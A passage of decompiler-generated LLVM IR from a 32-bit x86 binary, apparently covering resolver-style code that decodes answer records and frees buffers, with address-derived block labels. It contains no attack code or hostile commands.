  %v1_80533ce.pre = load i32, i32* @esp, align 4
  %v2_80533ce55 = add i32 %v1_80533ce.pre, 104
  %v3_80533ce56 = inttoptr i32 %v2_80533ce55 to i32*
  %v4_80533ce57 = load i32, i32* %v3_80533ce56, align 4
  %v5_80533ce58 = sub i32 %v0_80533ce.pre, %v4_80533ce57
  %v11_80533ce60 = xor i32 %v4_80533ce57, %v0_80533ce.pre
  %v12_80533ce61 = xor i32 %v5_80533ce58, %v0_80533ce.pre
  %v13_80533ce62 = and i32 %v12_80533ce61, %v11_80533ce60
  %v14_80533ce63 = icmp slt i32 %v13_80533ce62, 0
  %v16_80533ce65 = icmp slt i32 %v5_80533ce58, 0
  %v2_80533d266 = icmp eq i1 %v16_80533ce65, %v14_80533ce63
  br i1 %v2_80533d266, label %dec_label_pc_80533de, label %dec_label_pc_80533d4.lr.ph

dec_label_pc_80533d4.lr.ph:                       ; preds = %dec_label_pc_805329e
  %v0_80533d4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80533d4

dec_label_pc_80532aa:                             ; preds = %dec_label_pc_80533d4
  %v1_80532aa = add i32 %v0_80532aa67, 116
  store i32 %v1_80532aa, i32* %eax.global-to-local, align 4
  %v2_80532ae = add i32 %v0_80532aa67, -4
  %v3_80532ae = inttoptr i32 %v2_80532ae to i32*
  store i32 %v1_80532aa, i32* %v3_80532ae, align 4
  %v3_80532af = load i32, i32* %v3_80533d4, align 4
  %v5_80532af = add i32 %v0_80532aa67, -8
  %v6_80532af = inttoptr i32 %v5_80532af to i32*
  store i32 %v3_80532af, i32* %v6_80532af, align 4
  %v0_80532b3 = load i32, i32* @esi, align 4
  %v2_80532b3 = add i32 %v0_80532aa67, -12
  %v3_80532b3 = inttoptr i32 %v2_80532b3 to i32*
  store i32 %v0_80532b3, i32* %v3_80532b3, align 4
  %v2_80532b4 = add i32 %v0_80532aa67, -16
  %v3_80532b4 = inttoptr i32 %v2_80532b4 to i32*
  store i32 %v2_8052e6e, i32* %v3_80532b4, align 4
  %v0_80532b5 = call i32 @__decode_answer()
  store i32 %v0_80532b5, i32* @eax, align 4
  %v1_80532ba = load i32, i32* @esp, align 4
  %v2_80532ba = add i32 %v1_80532ba, 68
  %v3_80532ba = inttoptr i32 %v2_80532ba to i32*
  store i32 %v0_80532b5, i32* %v3_80532ba, align 4
  %v0_80532be = load i32, i32* @esp, align 4
  %v1_80532be = add i32 %v0_80532be, 16
  %v2_80532c1 = icmp slt i32 %v0_80532b5, 0
  %v1_80532c3 = icmp eq i1 %v2_80532c1, false
  br i1 %v1_80532c3, label %dec_label_pc_80532dd, label %dec_label_pc_80532c5

dec_label_pc_80532c5:                             ; preds = %dec_label_pc_80532aa
  %v0_80532c5 = load i32, i32* @ebx, align 4
  %v1_80532c5 = icmp eq i32 %v0_80532c5, 0
  br i1 %v1_80532c5, label %dec_label_pc_8053470, label %dec_label_pc_80532cd

dec_label_pc_80532cd:                             ; preds = %dec_label_pc_80532c5
  %v1_80532cd = add i32 %v0_80532be, 100
  %v2_80532cd = inttoptr i32 %v1_80532cd to i32*
  %v3_80532cd = load i32, i32* %v2_80532cd, align 4
  %v4_80532cd = icmp eq i32 %v3_80532cd, 0
  br i1 %v4_80532cd, label %dec_label_pc_8053470, label %dec_label_pc_80533de

dec_label_pc_80532dd:                             ; preds = %dec_label_pc_80532aa
  %v1_80532dd = add i32 %v0_80532be, 43
  %v2_80532dd = inttoptr i32 %v1_80532dd to i8*
  %v3_80532dd = load i8, i8* %v2_80532dd, align 1
  %v4_80532dd = icmp eq i8 %v3_80532dd, 0
  br i1 %v4_80532dd, label %dec_label_pc_805337e, label %dec_label_pc_80532e8

dec_label_pc_80532e8:                             ; preds = %dec_label_pc_80532dd
  %v0_80532e8 = load i32, i32* @edi, align 4
  %v1_80532e8 = add i32 %v0_80532e8, 28
  %v2_80532e8 = inttoptr i32 %v1_80532e8 to i32*
  %v3_80532e8 = load i32, i32* %v2_80532e8, align 4
  store i32 %v3_80532e8, i32* %eax.global-to-local, align 4
  %v2_80532eb = add i32 %v0_80532be, 160
  %v3_80532eb = inttoptr i32 %v2_80532eb to i32*
  store i32 %v3_80532e8, i32* %v3_80532eb, align 4
  %v0_80532f2 = load i32, i32* @edi, align 4
  %v1_80532f2 = add i32 %v0_80532f2, 32
  %v2_80532f2 = inttoptr i32 %v1_80532f2 to i32*
  %v3_80532f2 = load i32, i32* %v2_80532f2, align 4
  store i32 %v3_80532f2, i32* %eax.global-to-local, align 4
  %v1_80532f5 = load i32, i32* @esp, align 4
  %v2_80532f5 = add i32 %v1_80532f5, 148
  %v3_80532f5 = inttoptr i32 %v2_80532f5 to i32*
  store i32 %v3_80532f2, i32* %v3_80532f5, align 4
  %v0_80532fc = load i32, i32* @edi, align 4
  %v1_80532fc = add i32 %v0_80532fc, 36
  %v2_80532fc = inttoptr i32 %v1_80532fc to i32*
  %v3_80532fc = load i32, i32* %v2_80532fc, align 4
  store i32 %v3_80532fc, i32* %eax.global-to-local, align 4
  %v1_80532ff = load i32, i32* @esp, align 4
  %v2_80532ff = add i32 %v1_80532ff, 152
  %v3_80532ff = inttoptr i32 %v2_80532ff to i32*
  store i32 %v3_80532fc, i32* %v3_80532ff, align 4
  %v0_8053306 = load i32, i32* @ecx, align 4
  %v1_8053306 = load i32, i32* @esp, align 4
  %v2_8053306 = add i32 %v1_8053306, -4
  %v3_8053306 = inttoptr i32 %v2_8053306 to i32*
  store i32 %v0_8053306, i32* %v3_8053306, align 4
  %v1_8053307 = add i32 %v1_8053306, -8
  %v2_8053307 = inttoptr i32 %v1_8053307 to i32*
  store i32 40, i32* %v2_8053307, align 4
  %v1_8053309 = add i32 %v1_8053306, 116
  store i32 %v1_8053309, i32* %edx.global-to-local, align 4
  %v2_805330d = add i32 %v1_8053306, -12
  %v3_805330d = inttoptr i32 %v2_805330d to i32*
  store i32 %v1_8053309, i32* %v3_805330d, align 4
  %v0_805330e = load i32, i32* @edi, align 4
  %v2_805330e = add i32 %v1_8053306, -16
  %v3_805330e = inttoptr i32 %v2_805330e to i32*
  store i32 %v0_805330e, i32* %v3_805330e, align 4
  %v4_805330f = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805330f, i32* %eax.global-to-local, align 4
  %v0_8053314 = load i32, i32* @edi, align 4
  %v1_8053314 = add i32 %v0_8053314, 4
  %v2_8053314 = inttoptr i32 %v1_8053314 to i32*
  %v3_8053314 = load i32, i32* %v2_8053314, align 4
  store i32 %v3_8053314, i32* %eax.global-to-local, align 4
  %v0_8053317 = load i32, i32* @esp, align 4
  %v1_8053317 = add i32 %v0_8053317, 16
  %v9_805331a = icmp eq i32 %v3_8053314, 24
  br i1 %v9_805331a, label %dec_label_pc_80532e8.dec_label_pc_8053341_crit_edge, label %dec_label_pc_805331f

dec_label_pc_80532e8.dec_label_pc_8053341_crit_edge: ; preds = %dec_label_pc_80532e8
  %.pre24 = add i32 %v0_8053317, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8053341.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8053341

dec_label_pc_805331f:                             ; preds = %dec_label_pc_80532e8
  %v1_805331f = add i32 %v0_8053314, 28
  %v2_805331f = inttoptr i32 %v1_805331f to i32*
  %v3_805331f = load i32, i32* %v2_805331f, align 4
  %v4_805331f = icmp eq i32 %v3_805331f, 0
  br i1 %v4_805331f, label %dec_label_pc_80533de, label %dec_label_pc_8053329

dec_label_pc_8053329:                             ; preds = %dec_label_pc_805331f
  %v1_8053329 = add i32 %v0_8053317, 260
  %v2_8053329 = inttoptr i32 %v1_8053329 to i32*
  %v3_8053329 = load i32, i32* %v2_8053329, align 4
  %v12_8053329 = icmp eq i32 %v3_8053329, 1
  br i1 %v12_8053329, label %dec_label_pc_8053341, label %dec_label_pc_8053333

dec_label_pc_8053333:                             ; preds = %dec_label_pc_8053329
  %v12_8053333 = icmp eq i32 %v3_8053329, 28
  %v1_805333b = icmp eq i1 %v12_8053333, false
  br i1 %v1_805333b, label %dec_label_pc_80533de, label %dec_label_pc_8053341

dec_label_pc_8053341:                             ; preds = %dec_label_pc_80532e8.dec_label_pc_8053341_crit_edge, %dec_label_pc_8053333, %dec_label_pc_8053329
  %v4_8053341 = phi i32 [ %v4_8053341.pre, %dec_label_pc_80532e8.dec_label_pc_8053341_crit_edge ], [ %v3_8053329, %dec_label_pc_8053333 ], [ %v3_8053329, %dec_label_pc_8053329 ]
  %v15_8053341 = icmp eq i32 %v3_8053314, %v4_8053341
  br i1 %v15_8053341, label %dec_label_pc_8053356, label %dec_label_pc_805334a

dec_label_pc_805334a:                             ; preds = %dec_label_pc_8053341
  %v1_805334d = inttoptr i32 %v0_8053314 to i32*
  %v2_805334d = load i32, i32* %v1_805334d, align 4
  %v5_805334d = inttoptr i32 %v0_8053317 to i32*
  store i32 %v2_805334d, i32* %v5_805334d, align 4
  %v1_805334f = call i32 @free(i32 -1)
  store i32 %v1_805334f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533c6

dec_label_pc_8053356:                             ; preds = %dec_label_pc_8053341
  %v0_8053356 = load i32, i32* @ebx, align 4
  %v1_8053358 = sub i32 -1, %v0_8053356
  store i32 %v1_8053358, i32* %eax.global-to-local, align 4
  %v2_805335a = add i32 %v0_8053317, 120
  %v3_805335a = inttoptr i32 %v2_805335a to i32*
  %v4_805335a = load i32, i32* %v3_805335a, align 4
  %v5_805335a = add i32 %v4_805335a, %v1_8053358
  store i32 %v5_805335a, i32* %eax.global-to-local, align 4
  %v2_805335e = add i32 %v0_8053314, 36
  %v3_805335e = inttoptr i32 %v2_805335e to i32*
  store i32 %v5_805335a, i32* %v3_805335e, align 4
  %v0_8053361 = load i32, i32* @edi, align 4
  %v1_8053361 = add i32 %v0_8053361, 16
  %v2_8053361 = inttoptr i32 %v1_8053361 to i32*
  %v3_8053361 = load i32, i32* %v2_8053361, align 4
  %v1_8053364 = add i32 %v3_8053361, 4
  store i32 %v1_8053364, i32* %eax.global-to-local, align 4
  %v2_8053367 = add i32 %v0_8053361, 36
  %v3_8053367 = inttoptr i32 %v2_8053367 to i32*
  %v4_8053367 = load i32, i32* %v3_8053367, align 4
  %v7_8053367 = mul i32 %v4_8053367, %v1_8053364
  store i32 %v7_8053367, i32* %eax.global-to-local, align 4
  %v2_805336b = add i32 %v0_8053361, 32
  %v3_805336b = inttoptr i32 %v2_805336b to i32*
  %v4_805336b = load i32, i32* %v3_805336b, align 4
  %v6_805336e = icmp ugt i32 %v7_8053367, %v4_805336b
  br i1 %v6_805336e, label %dec_label_pc_8053356.dec_label_pc_80533de.loopexit_crit_edge, label %dec_label_pc_8053370

dec_label_pc_8053356.dec_label_pc_80533de.loopexit_crit_edge: ; preds = %dec_label_pc_8053356
  %v0_80533de.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80533de

dec_label_pc_8053370:                             ; preds = %dec_label_pc_8053356
  store i32 0, i32* %v3_8053367, align 4
  %v0_8053377 = load i32, i32* @esp, align 4
  %v1_8053377 = add i32 %v0_8053377, 27
  %v2_8053377 = inttoptr i32 %v1_8053377 to i8*
  store i8 0, i8* %v2_8053377, align 1
  %v1_80533c9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80533c9

dec_label_pc_805337e:                             ; preds = %dec_label_pc_80532dd
  %v1_8053381 = add i32 %v0_80532be, 132
  %v2_8053381 = inttoptr i32 %v1_8053381 to i32*
  %v3_8053381 = load i32, i32* %v2_8053381, align 4
  %v6_8053381 = inttoptr i32 %v0_80532be to i32*
  store i32 %v3_8053381, i32* %v6_8053381, align 4
  %v1_8053388 = call i32 @free(i32 -1)
  store i32 %v1_8053388, i32* %eax.global-to-local, align 4
  %v0_805338d = load i32, i32* @esp, align 4
  %v1_805338d = add i32 %v0_805338d, 16
  %v1_8053390 = add i32 %v0_805338d, 260
  %v2_8053390 = inttoptr i32 %v1_8053390 to i32*
  %v3_8053390 = load i32, i32* %v2_8053390, align 4
  store i32 %v3_8053390, i32* %eax.global-to-local, align 4
  %v1_8053397 = add i32 %v0_805338d, 136
  %v2_8053397 = inttoptr i32 %v1_8053397 to i32*
  %v3_8053397 = load i32, i32* %v2_8053397, align 4
  %v15_8053397 = icmp eq i32 %v3_8053397, %v3_8053390
  %v1_805339b = icmp eq i1 %v15_8053397, false
  br i1 %v1_805339b, label %dec_label_pc_80533c9, label %dec_label_pc_805339d

dec_label_pc_805339d:                             ; preds = %dec_label_pc_805337e
  %v0_805339d = load i32, i32* @edi, align 4
  %v1_805339d = add i32 %v0_805339d, 16
  %v2_805339d = inttoptr i32 %v1_805339d to i32*
  %v3_805339d = load i32, i32* %v2_805339d, align 4
  store i32 %v3_805339d, i32* %eax.global-to-local, align 4
  %v2_80533a0 = add i32 %v0_805338d, 148
  %v3_80533a0 = inttoptr i32 %v2_80533a0 to i32*
  %v4_80533a0 = load i32, i32* %v3_80533a0, align 4
  %v15_80533a0 = icmp eq i32 %v3_805339d, %v4_80533a0
  %v1_80533a7 = icmp eq i1 %v15_80533a0, false
  br i1 %v1_80533a7, label %dec_label_pc_8053463, label %dec_label_pc_80533ad

dec_label_pc_80533ad:                             ; preds = %dec_label_pc_805339d
  %v0_80533ad = load i32, i32* @edx, align 4
  %v2_80533ad = add i32 %v0_805338d, 12
  %v3_80533ad = inttoptr i32 %v2_80533ad to i32*
  store i32 %v0_80533ad, i32* %v3_80533ad, align 4
  %v0_80533ae = load i32, i32* %eax.global-to-local, align 4
  %v2_80533ae = add i32 %v0_805338d, 8
  %v3_80533ae = inttoptr i32 %v2_80533ae to i32*
  store i32 %v0_80533ae, i32* %v3_80533ae, align 4
  %v1_80533af = add i32 %v0_805338d, 152
  %v2_80533af = inttoptr i32 %v1_80533af to i32*
  %v3_80533af = load i32, i32* %v2_80533af, align 4
  %v5_80533af = add i32 %v0_805338d, 4
  %v6_80533af = inttoptr i32 %v5_80533af to i32*
  store i32 %v3_80533af, i32* %v6_80533af, align 4
  %v0_80533b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80533b6 = load i32, i32* @edi, align 4
  %v2_80533b6 = add i32 %v1_80533b6, 36
  %v3_80533b6 = inttoptr i32 %v2_80533b6 to i32*
  %v4_80533b6 = load i32, i32* %v3_80533b6, align 4
  %v7_80533b6 = mul i32 %v4_80533b6, %v0_80533b6
  store i32 %v7_80533b6, i32* %eax.global-to-local, align 4
  %v2_80533ba = add i32 %v1_80533b6, 28
  %v3_80533ba = inttoptr i32 %v2_80533ba to i32*
  %v4_80533ba = load i32, i32* %v3_80533ba, align 4
  %v5_80533ba = add i32 %v4_80533ba, %v7_80533b6
  store i32 %v5_80533ba, i32* %eax.global-to-local, align 4
  %v3_80533bd = inttoptr i32 %v0_805338d to i32*
  store i32 %v5_80533ba, i32* %v3_80533bd, align 4
  %v4_80533be = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80533be, i32* %eax.global-to-local, align 4
  %v0_80533c3 = load i32, i32* @edi, align 4
  %v1_80533c3 = add i32 %v0_80533c3, 36
  %v2_80533c3 = inttoptr i32 %v1_80533c3 to i32*
  %v3_80533c3 = load i32, i32* %v2_80533c3, align 4
  %v4_80533c3 = add i32 %v3_80533c3, 1
  store i32 %v4_80533c3, i32* %v2_80533c3, align 4
  br label %dec_label_pc_80533c6

dec_label_pc_80533c6:                             ; preds = %dec_label_pc_805334a, %dec_label_pc_80533ad
  %v0_80533c6 = load i32, i32* @esp, align 4
  %v1_80533c6 = add i32 %v0_80533c6, 16
  br label %dec_label_pc_80533c9

dec_label_pc_80533c9:                             ; preds = %dec_label_pc_805337e, %dec_label_pc_8053370, %dec_label_pc_80533c6
  %v1_80533c9 = phi i32 [ %v1_805338d, %dec_label_pc_805337e ], [ %v1_80533c9.pre, %dec_label_pc_8053370 ], [ %v1_80533c6, %dec_label_pc_80533c6 ]
  %v0_80533c9 = load i32, i32* @esi, align 4
  %v2_80533c9 = add i32 %v1_80533c9, 52
  %v3_80533c9 = inttoptr i32 %v2_80533c9 to i32*
  %v4_80533c9 = load i32, i32* %v3_80533c9, align 4
  %v5_80533c9 = add i32 %v4_80533c9, %v0_80533c9
  store i32 %v5_80533c9, i32* @esi, align 4
  %v0_80533cd = load i32, i32* @ebx, align 4
  %v1_80533cd = add i32 %v0_80533cd, 1
  store i32 %v1_80533cd, i32* @ebx, align 4
  %v2_80533ce = add i32 %v1_80533c9, 104
  %v3_80533ce = inttoptr i32 %v2_80533ce to i32*
  %v4_80533ce = load i32, i32* %v3_80533ce, align 4
  %v5_80533ce = sub i32 %v1_80533cd, %v4_80533ce
  %v11_80533ce = xor i32 %v4_80533ce, %v1_80533cd
  %v12_80533ce = xor i32 %v5_80533ce, %v1_80533cd
  %v13_80533ce = and i32 %v12_80533ce, %v11_80533ce
  %v14_80533ce = icmp slt i32 %v13_80533ce, 0
  %v16_80533ce = icmp slt i32 %v5_80533ce, 0
  %v2_80533d2 = icmp eq i1 %v16_80533ce, %v14_80533ce
  br i1 %v2_80533d2, label %dec_label_pc_80533de, label %dec_label_pc_80533d4

dec_label_pc_80533d4:                             ; preds = %dec_label_pc_80533d4.lr.ph, %dec_label_pc_80533c9
  %v0_80533d4 = phi i32 [ %v0_80533d4.pre, %dec_label_pc_80533d4.lr.ph ], [ %v5_80533c9, %dec_label_pc_80533c9 ]
  %v0_80532aa67 = phi i32 [ %v1_80533ce.pre, %dec_label_pc_80533d4.lr.ph ], [ %v1_80533c9, %dec_label_pc_80533c9 ]
  %v2_80533d4 = add i32 %v0_80532aa67, 16
  %v3_80533d4 = inttoptr i32 %v2_80533d4 to i32*
  %v4_80533d4 = load i32, i32* %v3_80533d4, align 4
  %v5_80533d4 = sub i32 %v0_80533d4, %v4_80533d4
  %v11_80533d4 = xor i32 %v4_80533d4, %v0_80533d4
  %v12_80533d4 = xor i32 %v5_80533d4, %v0_80533d4
  %v13_80533d4 = and i32 %v12_80533d4, %v11_80533d4
  %v14_80533d4 = icmp slt i32 %v13_80533d4, 0
  %v16_80533d4 = icmp slt i32 %v5_80533d4, 0
  %v2_80533d8 = icmp eq i1 %v16_80533d4, %v14_80533d4
  br i1 %v2_80533d8, label %dec_label_pc_80533de, label %dec_label_pc_80532aa

dec_label_pc_80533de:                             ; preds = %dec_label_pc_80532cd, %dec_label_pc_805329e, %dec_label_pc_80533c9, %dec_label_pc_805331f, %dec_label_pc_8053333, %dec_label_pc_80533d4, %dec_label_pc_8053356.dec_label_pc_80533de.loopexit_crit_edge
  %v0_80533de = phi i32 [ %v0_80533de.pre.pre, %dec_label_pc_8053356.dec_label_pc_80533de.loopexit_crit_edge ], [ %v1_80533ce.pre, %dec_label_pc_805329e ], [ %v1_80533c9, %dec_label_pc_80533c9 ], [ %v1_8053317, %dec_label_pc_805331f ], [ %v1_8053317, %dec_label_pc_8053333 ], [ %v0_80532aa67, %dec_label_pc_80533d4 ], [ %v1_80532be, %dec_label_pc_80532cd ]
  %v1_80533e1 = add i32 %v0_80533de, 20
  %v2_80533e1 = inttoptr i32 %v1_80533e1 to i32*
  %v3_80533e1 = load i32, i32* %v2_80533e1, align 4
  %v5_80533e1 = add i32 %v0_80533de, -16
  %v6_80533e1 = inttoptr i32 %v5_80533e1 to i32*
  store i32 %v3_80533e1, i32* %v6_80533e1, align 4
  %v1_80533e5 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80533e5, i32* %eax.global-to-local, align 4
  %v0_80533ea = load i32, i32* @esp, align 4
  %v1_80533ed = add i32 %v0_80533ea, 272
  %v2_80533ed = inttoptr i32 %v1_80533ed to i32*
  %v3_80533ed = load i32, i32* %v2_80533ed, align 4
  %v4_80533ed = icmp eq i32 %v3_80533ed, 0
  br i1 %v4_80533ed, label %dec_label_pc_8053402, label %dec_label_pc_80533f7

dec_label_pc_80533f7:                             ; preds = %dec_label_pc_80533de
  store i32 %v3_80533ed, i32* %edx.global-to-local, align 4
  %v2_80533fe = inttoptr i32 %v3_80533ed to i32*
  store i32 %v2_8052e6e, i32* %v2_80533fe, align 4
  %v0_805340e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805340e

dec_label_pc_8053402:                             ; preds = %dec_label_pc_80533de
  %v3_8053405 = inttoptr i32 %v0_80533ea to i32*
  store i32 %v2_8052e6e, i32* %v3_8053405, align 4
  %v1_8053406 = call i32 @free(i32 -1)
  store i32 %v1_8053406, i32* %eax.global-to-local, align 4
  %v0_805340b = load i32, i32* @esp, align 4
  %v1_805340b = add i32 %v0_805340b, 16
  br label %dec_label_pc_805340e

dec_label_pc_805340e:                             ; preds = %dec_label_pc_80533f7, %dec_label_pc_8053402
  %v0_805340e = phi i32 [ %v0_805340e.pre, %dec_label_pc_80533f7 ], [ %v1_805340b, %dec_label_pc_8053402 ]
  %v1_8053411 = add i32 %v0_805340e, 12
  %v2_8053411 = inttoptr i32 %v1_8053411 to i32*
  %v3_8053411 = load i32, i32* %v2_8053411, align 4
  %v5_8053411 = add i32 %v0_805340e, -16
  %v6_8053411 = inttoptr i32 %v5_8053411 to i32*
  store i32 %v3_8053411, i32* %v6_8053411, align 4
  %v1_8053415 = call i32 @free(i32 -1)
  store i32 %v1_8053415, i32* @eax, align 4
  %v0_805341a = load i32, i32* @esp, align 4
  %v1_805341d = add i32 %v0_805341a, 8
  %v2_805341d = inttoptr i32 %v1_805341d to i32*
  store i32 ptrtoint (i8** @global_var_80602e8.241 to i32), i32* %v2_805341d, align 4
  %v1_8053422 = add i32 %v0_805341a, 4
  %v2_8053422 = inttoptr i32 %v1_8053422 to i32*
  store i32 134552351, i32* %v2_8053422, align 4
  %v1_8053427 = add i32 %v0_805341a, 200
  store i32 %v1_8053427, i32* %ebx.global-to-local, align 4
  %v3_805342e = inttoptr i32 %v0_805341a to i32*
  store i32 %v1_8053427, i32* %v3_805342e, align 4
  %v2_805342f = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_805342f, i32* %eax.global-to-local, align 4
  %v0_8053434 = load i32, i32* @esp, align 4
  %v1_8053434 = inttoptr i32 %v0_8053434 to i32*
  store i32 ptrtoint (i8** @global_var_80602e8.241 to i32), i32* %v1_8053434, align 4
  %v1_805343b = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_805343b, i32* %eax.global-to-local, align 4
  %v0_8053440 = load i32, i32* @esp, align 4
  %v1_8053440 = add i32 %v0_8053440, 56
  %v2_8053440 = inttoptr i32 %v1_8053440 to i32*
  %v3_8053440 = load i32, i32* %v2_8053440, align 4
  store i32 %v3_8053440, i32* @eax, align 4
  %v1_8053444 = add i32 %v0_8053440, 60
  %v2_8053444 = inttoptr i32 %v1_8053444 to i32*
  %v3_8053444 = load i32, i32* %v2_8053444, align 4
  store i32 %v3_8053444, i32* %edx.global-to-local, align 4
  %v1_8053448 = inttoptr i32 %v0_8053440 to i32*
  %v3_8053448 = add i32 %v0_8053440, 4
  %v1_8053449 = inttoptr i32 %v3_8053448 to i32*
  %v1_805344a = sext i32 %v3_8053440 to i64
  store i64 %v1_805344a, i64* @global_var_8060300.242, align 256
  %v1_805344f = trunc i32 %v3_8053444 to i16
  store i16 %v1_805344f, i16* @global_var_805a044.243, align 4
  store i32 1, i32* %v1_8053449, align 4
  %v0_8053458 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053458, i32* %v1_8053448, align 4
  %v2_8053459 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_8053459, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805359a

dec_label_pc_8053463:                             ; preds = %dec_label_pc_805339d
  %v1_8053466 = inttoptr i32 %v0_805339d to i32*
  %v2_8053466 = load i32, i32* %v1_8053466, align 4
  %v5_8053466 = inttoptr i32 %v0_805338d to i32*
  store i32 %v2_8053466, i32* %v5_8053466, align 4
  %v1_8053468 = call i32 @free(i32 -1)
  store i32 %v1_8053468, i32* @eax, align 4
  %v0_805346d = load i32, i32* @esp, align 4
  %v1_805346d = add i32 %v0_805346d, 16
  br label %dec_label_pc_8053470

dec_label_pc_8053470:                             ; preds = %dec_label_pc_80531a2, %dec_label_pc_80532cd, %dec_label_pc_80532c5, %dec_label_pc_8053261, %dec_label_pc_80531e7, %dec_label_pc_80531c3, %dec_label_pc_8053463
  %v1_8053477 = phi i32 [ %v1_80531b7, %dec_label_pc_80531a2 ], [ %v1_80532be, %dec_label_pc_80532cd ], [ %v1_80532be, %dec_label_pc_80532c5 ], [ %v1_80531d8, %dec_label_pc_8053261 ], [ %v1_80531d8, %dec_label_pc_80531e7 ], [ %v1_80531d8, %dec_label_pc_80531c3 ], [ %v1_805346d, %dec_label_pc_8053463 ]
  %v1_8053470 = add i32 %v1_8053477, 51
  %v2_8053470 = inttoptr i32 %v1_8053470 to i8*
  %v3_8053470 = load i8, i8* %v2_8053470, align 1
  %v4_8053470 = icmp eq i8 %v3_8053470, 0
  %v1_8053475 = icmp eq i1 %v4_8053470, false
  br i1 %v1_8053475, label %dec_label_pc_80534bb, label %dec_label_pc_8053477

dec_label_pc_8053477:                             ; preds = %dec_label_pc_8053470
  %v0_8053477 = load i32, i32* @ecx, align 4
  %v2_8053477 = add i32 %v1_8053477, -4
  %v3_8053477 = inttoptr i32 %v2_8053477 to i32*
  store i32 %v0_8053477, i32* %v3_8053477, align 4
  %v1_8053478 = add i32 %v1_8053477, -8
  %v2_8053478 = inttoptr i32 %v1_8053478 to i32*
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* %v2_8053478, align 4
  %v1_805347d = add i32 %v1_8053477, -12
  %v2_805347d = inttoptr i32 %v1_805347d to i32*
  store i32 134552351, i32* %v2_805347d, align 4
  %v1_8053482 = add i32 %v1_8053477, 184
  store i32 %v1_8053482, i32* @esi, align 4
  %v2_8053489 = add i32 %v1_8053477, -16
  %v3_8053489 = inttoptr i32 %v2_8053489 to i32*
  store i32 %v1_8053482, i32* %v3_8053489, align 4
  %v2_805348a = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_805348a, i32* %eax.global-to-local, align 4
  %v0_805348f = load i32, i32* @esp, align 4
  %v1_805348f = inttoptr i32 %v0_805348f to i32*
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* %v1_805348f, align 4
  %v1_8053496 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8053496, i32* %eax.global-to-local, align 4
  %v0_805349b = load i32, i32* @global_var_8060738.244, align 8
  store i32 %v0_805349b, i32* %ebx.global-to-local, align 4
  %v0_80534a1 = load i32, i32* @esp, align 4
  %v1_80534a1 = inttoptr i32 %v0_80534a1 to i32*
  %v2_80534a1 = load i32, i32* %v1_80534a1, align 4
  store i32 %v2_80534a1, i32* @eax, align 4
  %v3_80534a1 = add i32 %v0_80534a1, 4
  %v1_80534a2 = inttoptr i32 %v3_80534a1 to i32*
  %v2_80534a2 = load i32, i32* %v1_80534a2, align 4
  store i32 %v2_80534a2, i32* %edx.global-to-local, align 4
  %v1_80534a3 = add i32 %v0_805349b, -1
  store i32 %v1_80534a3, i32* @ebx, align 4
  store i32 1, i32* %v1_80534a2, align 4
  %v0_80534a6 = load i32, i32* @esi, align 4
  store i32 %v0_80534a6, i32* %v1_80534a1, align 4
  %v2_80534a7 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_80534a7, i32* %eax.global-to-local, align 4
  %v0_80534ac = load i32, i32* @esp, align 4
  %v1_80534ac = add i32 %v0_80534ac, 16
  %v1_80534af = add i32 %v0_80534ac, 52
  %v2_80534af = inttoptr i32 %v1_80534af to i32*
  %v3_80534af = load i32, i32* %v2_80534af, align 4
  %v4_80534af = load i32, i32* @ebx, align 4
  %v5_80534af = sub i32 %v3_80534af, %v4_80534af
  %v11_80534af = xor i32 %v4_80534af, %v3_80534af
  %v12_80534af = xor i32 %v5_80534af, %v3_80534af
  %v13_80534af = and i32 %v12_80534af, %v11_80534af
  %v14_80534af = icmp slt i32 %v13_80534af, 0
  %v16_80534af = icmp slt i32 %v5_80534af, 0
  %v2_80534b3 = icmp eq i1 %v16_80534af, %v14_80534af
  br i1 %v2_80534b3, label %dec_label_pc_80534bb, label %dec_label_pc_80534b5

dec_label_pc_80534b5:                             ; preds = %dec_label_pc_8053477
  %v4_80534b5 = add i32 %v3_80534af, 1
  store i32 %v4_80534b5, i32* %v2_80534af, align 4
  br label %dec_label_pc_80534dc.backedge

dec_label_pc_80534bb:                             ; preds = %dec_label_pc_8053144, %dec_label_pc_8053470, %dec_label_pc_805315b, %dec_label_pc_8053477
  %v1_80534ca = phi i32 [ %v1_8053477, %dec_label_pc_8053470 ], [ %v1_8053197, %dec_label_pc_805315b ], [ %v1_80534ac, %dec_label_pc_8053477 ], [ %v0_80534bb.pre, %dec_label_pc_8053144 ]
  %v1_80534bb = add i32 %v1_80534ca, 40
  %v2_80534bb = inttoptr i32 %v1_80534bb to i32*
  %v3_80534bb = load i32, i32* %v2_80534bb, align 4
  %v1_80534bf = add i32 %v3_80534bb, 1
  store i32 %v1_80534bf, i32* %eax.global-to-local, align 4
  %v1_80534c0 = ashr i32 %v1_80534bf, 31
  store i32 %v1_80534c0, i32* %edx.global-to-local, align 4
  %v1_80534c1 = add i32 %v1_80534ca, 248
  %v2_80534c1 = inttoptr i32 %v1_80534c1 to i32*
  %v3_80534c1 = load i32, i32* %v2_80534c1, align 4
  %v5_80534c1 = zext i32 %v1_80534bf to i64
  %v7_80534c1 = zext i32 %v1_80534c0 to i64
  %v8_80534c1 = mul nuw i64 %v7_80534c1, 4294967296
